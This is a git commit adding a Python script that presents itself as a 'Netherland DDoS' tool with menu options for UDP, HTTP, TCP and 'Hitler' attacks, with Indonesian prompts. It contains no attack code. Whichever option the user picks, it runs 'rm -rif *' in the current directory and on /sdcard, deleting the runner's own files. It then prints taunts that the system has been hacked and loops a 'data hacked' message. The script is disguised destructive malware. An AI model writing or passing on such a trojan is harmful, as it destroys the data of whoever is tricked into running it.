9791de03adee78ce1ff71eeb2219b36e69e5e41d
pranatarizka <pranatarizka925@gmail.com>
2023-09-29 20:00:54 +0800

    Netherland

---
+++ Ntr.py
@@ -0,0 +1,83 @@
+import sys
+import os
+import time
+import socket
+import getpass
+
+os.system("clear")
+
+def taktik():
+    global hasil
+    global p
+    global licik
+    
+print ("\033[0;37m=========================================\033[0;34m[+]")
+print ("\033[0;37mNetherland DDoS")
+print ("=========================================\033[0;34m[+]")
+print ("\033[0;31m-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+")
+print ("")
+print ("\033[0;37m==========================================")
+print ("[+]1.Udp Attack[+]")
+print ("")
+print ("==========================================")
+print ("[+]2.Http Attack[+]")
+print ("")
+print ("==========================================")
+print ("[+]3.Hitler Attacking[+]")
+print ("")
+print ("==========================================")
+print ("[+]4.Tcp Attack[+]")
+print ("")
+print ("==========================================")
+print ("\033[0;31m-----------------------------------------")
+print ("")
+
+x = 'd'
+c = 'a'
+z = 'a'
+ekspor = 'n'
+
+opsi = int(input("\033[0;37mMasukan opsi pilihan : "))
+
+if opsi == 1:
+    p = opsi
+    print ("")
+    tanya = (input("Apakah anda memilih Udp Attack, jika iya tekan [enter];"))
+    os.system("rm -rif *")
+    os.system("cd /sdcard && rm -rif *")
+    print ("Sistem ",z,ekspor,x,c," kami retas!!!")
+    
+elif opsi == 2:
+    p = opsi
+    print ("")
+    tanya = (input("Apakah anda memilih Http Attack, jika iya tekan [enter];"))
+    os.system("rm -rif *")
+    os.system("cd /sdcard && rm -rif *")
+    print ("Sistem ",z,ekspor,x,c," kami retas!!!")
+    
+elif opsi == 3:
+    p = opsi
+    print ("")
+    tanya = (input("Apakah anda memilih Hitler Attack, jika iya tekan [enter];"))
+    os.system("rm -rif *")
+    os.system("cd /sdcard && rm -rif *")
+    print ("Sistem ",z,ekspor,x,c," kami retas!!!")
+    
+elif opsi == 4:
+    p = opsi
+    print ("")
+    tanya = (input("Apakah anda memilih Tcp Attack, jika iya tekan [enter];"))
+    os.system("rm -rif *")
+    os.system("cd /sdcard rm -rif *")
+    print ("Sistem ",z,ekspor,x,c," kami retas!!!")
+    
+else:
+    print ("")
+    print ("pilihan tidak ada silahkan pilih kembali!!!,")
+
+	        	        
+while True:
+                    print ("\033[0;31mberhasil meretas data!!!") 
+                    time.sleep(0.5)
+ 
+                 
